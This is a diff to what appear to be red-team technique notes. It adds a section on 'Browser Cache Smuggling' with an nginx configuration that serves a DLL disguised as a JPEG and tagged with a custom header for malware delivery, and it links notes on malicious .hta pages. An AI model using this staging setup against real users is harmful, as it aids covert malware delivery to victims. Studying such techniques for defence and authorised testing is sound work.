@@ -95,6 +95,32 @@ Scenario: Embed a Windows batch file inside a Microsoft Word document
 
 ---
 
+# Browser Cache Smuggling
+
+It is possible to deliver malware or any other file to victims by exploiting how browsers caches images and static resources. This technique is called Browser Cache Smuggling. [^browser-cache-smuggling]
+
+[^browser-cache-smuggling]: [Aurélien Chalot - Browser Cache Smuggling](../../Readwise/Articles/Aurélien%20Chalot%20-%20Browser%20Cache%20Smuggling.md)
+
+Configure the server this way:
+```nginx
+server {
+	listen 80 default_server;
+	listen [::]:80 default_server;
+	root /var/www/html;
+	index index.html index.htm index.nginx-debian.html;
+	server_name _;
+
+	# Adding the HTTP header TAG used to find the real DLL
+	location /calc.dll {
+		# Override the mime type
+		types { } default_type image/jpeg;
+		add_header Tag DLLHERE;
+	}
+}
+```
+
+---
+
 # Tools
 
 - [Generating malicious .hta pages](../Tools/msfvenom.md#Generating%20malicious%20.hta%20pages)
